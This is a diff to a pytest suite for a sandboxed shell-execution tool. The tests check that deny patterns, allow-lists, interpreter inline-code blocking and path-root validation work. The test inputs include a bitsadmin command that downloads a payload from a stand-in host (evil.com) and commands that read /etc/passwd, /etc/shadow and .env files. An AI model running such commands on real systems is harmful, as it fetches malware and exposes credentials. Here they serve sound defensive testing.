@@ -5,7 +5,8 @@ from unittest.mock import patch
 
 import pytest
 
-from pantheon.tools import ShellExec, _check_allow_list
+from pantheon.tools import ShellExec
+from pantheon.tools.shell_safety import _check_allow_list
 
 _IS_WINDOWS = platform.system() == "Windows"
 _UNIX_ONLY = pytest.mark.skipif(_IS_WINDOWS, reason="Unix-specific shell test")
@@ -558,7 +559,9 @@ class TestLolbinAndWslDenyPatterns:
         tool = ShellExec()
         result = tool.execute(
             {
-                "command": "bitsadmin /transfer job1 http://evil.com/payload.exe C:\\temp\\payload.exe",
+                "command": (
+                    "bitsadmin /transfer job1 http://evil.com/payload.exe C:\\temp\\payload.exe"
+                ),
                 "workdir": "",
             }
         )
@@ -694,7 +697,6 @@ class TestAllowListMetacharacters:
         "cmd",
         [
             "git status",
-            "python --version",
             "pytest tests/ -v --tb=short",
             "ruff check src/",
             "ls -la",
@@ -710,21 +712,25 @@ class TestAllowListMetacharacters:
 class TestInterpreterInlineBlocking:
     """Task 1.4: Block interpreter inline execution (-c/-e) in allow-list mode."""
 
-    def test_blocks_python_c(self):
+    def test_blocks_python_c(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "python3,echo")
         result = _check_allow_list('python3 -c "import os"')
         assert result is not None
         assert "inline code execution" in result
 
-    def test_blocks_node_e(self):
+    def test_blocks_node_e(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "node,echo")
         result = _check_allow_list('node -e "process.exit(1)"')
         assert result is not None
         assert "inline code execution" in result
 
-    def test_allows_python_script(self):
+    def test_allows_python_script(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "python3,echo")
         result = _check_allow_list("python3 script.py")
         assert result is None
 
-    def test_allows_python_m(self):
+    def test_allows_python_m(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "python3,echo")
         result = _check_allow_list("python3 -m pytest")
         assert result is None
 
@@ -734,12 +740,14 @@ class TestInterpreterInlineBlocking:
         assert result is not None
         assert "inline code execution" in result
 
-    def test_blocks_combined_flags_python(self):
+    def test_blocks_combined_flags_python(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "python3,echo")
         result = _check_allow_list('python3 -Bc "import os"')
         assert result is not None
         assert "inline code execution" in result
 
-    def test_blocks_combined_flags_node(self):
+    def test_blocks_combined_flags_node(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "node,echo")
         result = _check_allow_list('node -re "process.exit()"')
         assert result is not None
         assert "inline code execution" in result
@@ -787,3 +795,123 @@ class TestSensitiveFileAccess:
         result = tool.execute({"command": "cat README.md", "workdir": ""})
         assert "secrets file" not in result
         assert "blocked by safety policy" not in result
+
+
+class TestPathArgumentValidation:
+    """Phase 1A (Kali F-01): path arguments validated against allowed_roots."""
+
+    def test_cat_outside_allowed_roots_blocked(self, tmp_path):
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": "cat /etc/passwd", "workdir": ""})
+        assert "error" in result
+        assert "outside allowed roots" in result
+
+    def test_cat_inside_allowed_roots_allowed(self, tmp_path):
+        target = tmp_path / "file.txt"
+        target.write_text("hello")
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": f"cat {target}", "workdir": ""})
+        assert "outside allowed roots" not in result
+
+    def test_find_outside_roots_blocked(self, tmp_path):
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": 'find / -name "*.env"', "workdir": ""})
+        assert "error" in result
+        assert "outside allowed roots" in result
+
+    def test_grep_with_flag_arguments_not_confused_for_paths(self, tmp_path):
+        src = tmp_path / "src"
+        src.mkdir()
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": f"grep -r pattern {src}", "workdir": ""})
+        assert "outside allowed roots" not in result
+
+    def test_path_check_skipped_for_non_file_commands(self, tmp_path):
+        """git status should not trigger path argument checking."""
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": "git status", "workdir": ""})
+        assert "outside allowed roots" not in result
+
+    def test_head_outside_roots_blocked(self, tmp_path):
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": "head /etc/shadow", "workdir": ""})
+        assert "error" in result
+        assert "outside allowed roots" in result
+
+    def test_no_roots_means_no_path_check(self):
+        """When allowed_roots is None, path checking is skipped entirely."""
+        tool = ShellExec(allowed_roots=None)
+        result = tool.execute({"command": "cat /etc/hostname", "workdir": ""})
+        assert "outside allowed roots" not in result
+
+    def test_relative_dot_path_inside_roots(self, tmp_path, monkeypatch):
+        """Relative paths like ./file.txt resolve against cwd."""
+        monkeypatch.chdir(tmp_path)
+        (tmp_path / "data.txt").write_text("ok")
+        tool = ShellExec(allowed_roots=[str(tmp_path)])
+        result = tool.execute({"command": "cat ./data.txt", "workdir": ""})
+        assert "outside allowed roots" not in result
+
+
+class TestInterpreterRemovedFromDefault:
+    """Phase 1B (Kali F-03): python/python3/node removed from default allow-list."""
+
+    def test_python3_removed_from_default_allow_list(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("python3 script.py")
+        assert result is not None
+        assert "not in allow-list" in result
+
+    def test_python_removed_from_default_allow_list(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("python script.py")
+        assert result is not None
+        assert "not in allow-list" in result
+
+    def test_node_removed_from_default_allow_list(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("node app.js")
+        assert result is not None
+        assert "not in allow-list" in result
+
+    def test_npm_install_allowed(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("npm install express")
+        assert result is None
+
+    def test_npm_exec_blocked(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("npm exec cowsay")
+        assert result is not None
+        assert "npm exec" in result or "npx" in result
+
+    def test_npx_blocked(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("npx create-react-app myapp")
+        assert result is not None
+        assert "not in allow-list" in result
+
+    def test_pip_still_allowed(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("pip install requests")
+        assert result is None
+
+    def test_pytest_still_allowed(self, monkeypatch):
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.delenv("SHELL_EXEC_ALLOW_LIST", raising=False)
+        result = _check_allow_list("pytest tests/ -v")
+        assert result is None
+
+    def test_explicit_allow_list_can_add_python3(self, monkeypatch):
+        """Operators can re-enable python3 via SHELL_EXEC_ALLOW_LIST."""
+        monkeypatch.setenv("SHELL_EXEC_MODE", "allow-list")
+        monkeypatch.setenv("SHELL_EXEC_ALLOW_LIST", "python3,echo")
+        result = _check_allow_list("python3 script.py")
+        assert result is None
